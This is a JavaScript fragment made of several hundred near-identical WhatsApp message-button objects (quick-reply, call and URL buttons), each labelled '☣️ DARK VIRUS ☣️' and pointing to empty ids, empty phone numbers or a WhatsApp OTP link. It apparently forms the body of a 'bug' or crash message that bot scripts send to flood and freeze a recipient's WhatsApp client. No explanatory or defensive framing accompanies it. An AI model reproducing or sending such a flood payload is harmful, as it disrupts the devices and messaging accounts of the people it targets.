{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
